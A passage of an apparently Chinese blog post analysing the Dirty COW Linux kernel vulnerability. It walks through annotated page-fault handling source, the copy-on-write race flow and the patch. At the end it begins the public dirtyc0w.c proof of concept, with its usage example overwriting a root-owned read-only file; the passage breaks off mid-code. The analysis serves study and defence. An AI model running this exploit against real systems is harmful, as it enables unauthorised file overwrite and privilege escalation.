pmd);<br><br><span class="hljs-keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123; <span class="hljs-comment">//若存在write标志则标记为dirty</span><br>ret = wp_huge_pmd(mm, vma, address, pmd,<br>orig_pmd, flags);<br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>huge_pmd_set_accessed(mm, vma, address, pmd,<br>      orig_pmd, dirty);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span><br><span class="hljs-comment"> * run pte_offset_map on the pmd, if an huge pmd could</span><br><span class="hljs-comment"> * materialize from under us from a different thread.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;<br>    unlikely(__pte_alloc(mm, vma, pmd, address)))<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><span class="hljs-comment">/* if an huge pmd materialized from under us just retry later */</span><br><span class="hljs-keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * A regular pmd is established and it can&#x27;t morph into a huge pmd</span><br><span class="hljs-comment"> * from under us anymore at this point because we hold the mmap_sem</span><br><span class="hljs-comment"> * read mode and khugepaged takes it in write mode. So now it&#x27;s</span><br><span class="hljs-comment"> * safe to run pte_offset_map().</span><br><span class="hljs-comment"> */</span><br>pte = pte_offset_map(pmd, address); <span class="hljs-comment">//找到pte项的偏移</span><br><br><span class="hljs-keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,</span><br><span class="hljs-params">     <span class="hljs-type">pte_t</span> *pte, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-type">pte_t</span> entry;<br><span class="hljs-type">spinlock_t</span> *ptl;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * some architectures can have larger ptes than wordsize,</span><br><span class="hljs-comment"> * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span><br><span class="hljs-comment"> * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span><br><span class="hljs-comment"> * The code below just needs a consistent view for the ifs and</span><br><span class="hljs-comment"> * we later double check anyway with the ptl lock held. So here</span><br><span class="hljs-comment"> * a barrier will do.</span><br><span class="hljs-comment"> */</span><br>entry = *pte;<br>barrier();<br><span class="hljs-keyword">if</span> (!pte_present(entry)) &#123;<br><span class="hljs-keyword">if</span> (pte_none(entry)) &#123;<br><span class="hljs-keyword">if</span> (vma_is_anonymous(vma)) <span class="hljs-comment">//include/linux/mm.h:1287 </span><br><span class="hljs-comment">//处理匿名文件映射的缺页</span><br><span class="hljs-keyword">return</span> do_anonymous_page(mm, vma, address,<br> pte, pmd, flags);<br><span class="hljs-keyword">else</span><br><span class="hljs-comment">//处理文件映射的缺页</span><br><span class="hljs-keyword">return</span> do_fault(mm, vma, address, pte, pmd,<br>flags, entry);<br>&#125;<br><span class="hljs-comment">//页表存在，但不存在于物理内存之中，从磁盘交换区换入物理内存</span><br><span class="hljs-keyword">return</span> do_swap_page(mm, vma, address,<br>pte, pmd, flags, entry);<br>&#125;<br><br><span class="hljs-keyword">if</span> (pte_protnone(entry))<br><span class="hljs-keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);<br><br>ptl = pte_lockptr(mm, pmd);<br>spin_lock(ptl);<br><span class="hljs-keyword">if</span> (unlikely(!pte_same(*pte, entry)))<br><span class="hljs-keyword">goto</span> unlock;<br><span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123; <span class="hljs-comment">//由于写导致的缺页处理</span><br><span class="hljs-keyword">if</span> (!pte_write(entry)) <span class="hljs-comment">//pte表项不能写</span><br><span class="hljs-keyword">return</span> do_wp_page(mm, vma, address,<br>pte, pmd, ptl, entry); <span class="hljs-comment">//在这个函数里，kernel将会根据物理页遍历所有对应的虚拟页（使用链表）求map cnt，如果map cnt为1，说明当前物理页仅被一个进程使用，不需要COW。（这个过程加锁，防止cnt不同步）。这种情况下，则调用 wp_page_reuse 。参考https://zhuanlan.zhihu.com/p/70779813</span><br>entry = pte_mkdirty(entry);<br>&#125;<br>entry = pte_mkyoung(entry);<br><span class="hljs-keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;<br>update_mmu_cache(vma, address, pte);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is needed only for protection faults but the arch code</span><br><span class="hljs-comment"> * is not yet telling us if this is a protection fault or not.</span><br><span class="hljs-comment"> * This still avoids useless tlb flushes for .text page faults</span><br><span class="hljs-comment"> * with threads.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)<br>flush_tlb_fix_spurious_fault(vma, address);<br>&#125;<br>unlock:<br>pte_unmap_unlock(pte, ptl);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pte_t</span> *page_table, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">pte_t</span> orig_pte)</span><br>&#123;<br><span class="hljs-type">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK) <span class="hljs-comment">//取页起始地址</span><br>- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;<br><br>pte_unmap(page_table);<br><span class="hljs-comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span><br><span class="hljs-keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)<br><span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;<br><span class="hljs-keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE)) <span class="hljs-comment">//若不需要写则调用do_read_fault函数，直接将原始页返回</span><br><span class="hljs-keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,<br>orig_pte);<br><span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED)) <span class="hljs-comment">//若需要写，则使用写时复制，返回新的页</span><br><span class="hljs-keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,<br>orig_pte);<br><span class="hljs-keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);<span class="hljs-comment">//需要共享页时也将原始的页返回</span><br>&#125;<br></code></pre></td></tr></table></figure><h6 id="do-cow-fault"><a href="#do-cow-fault" class="headerlink" title="do_cow_fault"></a>do_cow_fault</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params"><span class="hljs-type">pgoff_t</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">pte_t</span> orig_pte)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br><span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">//分配和准备anon_vma</span><br><span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br><span class="hljs-comment">//分配一个用户页面</span><br>new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);<br><span class="hljs-keyword">if</span> (!new_page)<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br><span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;<br>page_cache_release(new_page);<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>&#125;<br><span class="hljs-comment">//从根据new_page分配新的页给fault_page</span><br>ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);<br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">goto</span> uncharge_out;<br><br><span class="hljs-keyword">if</span> (fault_page)<br><span class="hljs-comment">//将fault_page里的值拷贝到new_page中</span><br>copy_user_highpage(new_page, fault_page, address, vma);<br>__SetPageUptodate(new_page);<br><br>pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br><span class="hljs-keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;<br>pte_unmap_unlock(pte, ptl);<br><span class="hljs-keyword">if</span> (fault_page) &#123;<br>unlock_page(fault_page);<br>page_cache_release(fault_page);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The fault handler has no page to lock, so it holds</span><br><span class="hljs-comment"> * i_mmap_lock for read to protect against truncate.</span><br><span class="hljs-comment"> */</span><br>i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);<br>&#125;<br><span class="hljs-keyword">goto</span> uncharge_out;<br>&#125;<br><span class="hljs-comment">//将建立物理页与pte表的映射,此时完成虚拟地址与物理地址的映射</span><br>do_set_pte(vma, address, new_page, pte, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>mem_cgroup_commit_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br>lru_cache_add_active_or_unevictable(new_page, vma);<br>pte_unmap_unlock(pte, ptl);<br><span class="hljs-keyword">if</span> (fault_page) &#123;<br>unlock_page(fault_page);<br>page_cache_release(fault_page);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The fault handler has no page to lock, so it holds</span><br><span class="hljs-comment"> * i_mmap_lock for read to protect against truncate.</span><br><span class="hljs-comment"> */</span><br>i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br>mem_cgroup_cancel_charge(new_page, memcg);<br>page_cache_release(new_page);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="do-read-fault"><a href="#do-read-fault" class="headerlink" title="do_read_fault"></a>do_read_fault</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_read_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params"><span class="hljs-type">pgoff_t</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">pte_t</span> orig_pte)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>;</span><br><span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span><br><span class="hljs-comment"> * if page by the offset is not ready to be mapped (cold cache or</span><br><span class="hljs-comment"> * something).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="hljs-number">1</span>) &#123;<br>pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br>do_fault_around(vma, address, pte, pgoff, flags);<br><span class="hljs-keyword">if</span> (!pte_same(*pte, orig_pte))<br><span class="hljs-keyword">goto</span> unlock_out;<br>pte_unmap_unlock(pte, ptl);<br>&#125;<br><br>ret = __do_fault(vma, address, pgoff, flags, <span class="hljs-literal">NULL</span>, &amp;fault_page);<br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">return</span> ret;<br><br>pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br><span class="hljs-keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;<br>pte_unmap_unlock(pte, ptl);<br>unlock_page(fault_page);<br>page_cache_release(fault_page);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>    <span class="hljs-comment">//将虚拟地址与fault_page进行映射</span><br>do_set_pte(vma, address, fault_page, pte, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>unlock_page(fault_page);<br>unlock_out:<br>pte_unmap_unlock(pte, ptl);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="do-fault-1"><a href="#do-fault-1" class="headerlink" title="__do_fault"></a>__do_fault</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __do_fault(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,<br><span class="hljs-type">pgoff_t</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,<br><span class="hljs-keyword">struct</span> page *cow_page, <span class="hljs-keyword">struct</span> page **page)<br>&#123;<br><span class="hljs-comment">//__do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_fault</span> <span class="hljs-title">vmf</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>vmf.virtual_address = (<span class="hljs-type">void</span> __user *)(address &amp; PAGE_MASK);<br>vmf.pgoff = pgoff;<br>vmf.flags = flags;<br>vmf.page = <span class="hljs-literal">NULL</span>;<br>vmf.cow_page = cow_page;<br><br>ret = vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf);<span class="hljs-comment">//使用指定的错误处理的函数</span><br><span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">if</span> (!vmf.page)<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">if</span> (unlikely(PageHWPoison(vmf.page))) &#123;<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_LOCKED)<br>unlock_page(vmf.page);<br>page_cache_release(vmf.page);<br><span class="hljs-keyword">return</span> VM_FAULT_HWPOISON;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!(ret &amp; VM_FAULT_LOCKED)))<br>lock_page(vmf.page);<br><span class="hljs-keyword">else</span><br>VM_BUG_ON_PAGE(!PageLocked(vmf.page), vmf.page);<br><br> out:<br>*page = vmf.page;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="页缺失流程"><a href="#页缺失流程" class="headerlink" title="页缺失流程"></a>页缺失流程</h1><p>需要通过三次<code>follow_page_mask</code>以及两次<code>faultin_page</code>才能够正确返回物理页</p><ul><li>第一次<code>follow_page_mask</code>由于虚拟地址与物理页未完成映射所以会直接返回进入<code>faultin_page</code>完成缺页处理</li><li>第一次<code>faultin_page</code>会进入<code>do_cow_fault</code>完成写时复制，建立新页与虚拟地址的映射</li><li>第二次<code>follow_page_mask</code>，虽然页表已经与虚拟地址完成映射，但是<code>pte</code>项不具备写权限但是用户需要进行写的操作，因此会判定刚刚完成映射的物理页不符合用户的请求，因此返回<code>NULL</code></li><li>第二次<code>faultin_page</code>则是将需要写物理页的标志位给清除</li><li>第三次<code>follow_page_mask</code>，发现页表项已经完成映射，并且符合用户的请求直接将映射后的物理页返回给用户</li></ul><h2 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h2><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091155834.png" alt="1"></p><h2 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h2><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091155369.png" alt="2"></p><h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202306091150792.png" alt="3"></p><h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>可以看到补丁增加了写诗复制的标志位，而且不会将<code>FOLL_WRITE</code>标志进行清空，而是或上写诗复制的标志位。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101175601751.png" alt="image-20230101175601751"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>脏牛漏洞利用写诗复制的特性，利用条件竞争漏洞去删除用于判断写诗复制的关键标志位，从而诱导内核出错。并且由于利用简单，影响力巨大。后续出现的脏管道漏洞也是因为与脏牛漏洞类型得以命名。</p><h1 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">####################### dirtyc0w.c #######################</span><br><span class="hljs-comment">$ sudo -s</span><br><span class="hljs-comment"># echo this is not a test &gt; foo</span><br><span class="hljs-comment"># chmod 0404 foo</span><br><span class="hljs-comment">$ ls -lah foo</span><br><span class="hljs-comment">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span><br><span class="hljs-comment">$ cat foo</span><br><span class="hljs-comment">this is not a test</span><br><span class="hljs-comment">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="hljs-comment">$ ./dirtyc0w foo m00000000000000000</span><br><span class="hljs-comment">mmap 56123000</span><br><span class="hljs-comment">madvise 0</span><br><span class="hljs-comment">procselfmem 1800000000</span><br><span class="hljs-comment">$ cat foo</span><br><span class="hljs-comment">m00000000000000000</span><br><span class="hljs-comment">####################### dirtyc0w.c #######################</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-built_in">map</span>;<br><span class="hljs-type">int</span> f;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">char</span> *name;<br> <br><span class="hljs-type">void</span> *<span class="hljs-title function_">madviseThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++)<br>  &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</span><br><span class="hljs-comment">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</span><br><span class="hljs-comment">&gt; while having the page of the executable mmapped in memory.</span><br><span 